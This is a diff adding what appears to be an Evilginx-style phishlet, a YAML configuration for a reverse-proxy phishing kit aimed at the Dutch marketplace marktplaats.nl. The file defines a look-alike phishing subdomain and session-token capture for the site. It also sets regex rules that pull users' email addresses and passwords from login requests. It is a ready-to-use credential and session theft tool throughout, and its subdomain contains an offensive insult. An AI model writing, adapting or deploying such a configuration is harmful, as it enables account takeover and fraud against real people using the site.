@@ -1,0 +1,28 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'marktplaatskankerkinderewn', orig_sub: 'www', domain: 'marktplaats.nl', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'marktplaats.nl'
+
+auth_urls:
+  - '/home/news'
+  - '/home/.*'   
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'post'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'post'
+
+login:
+  domain: 'www.marktplaats.nl'
+  path: '/account/login.html'
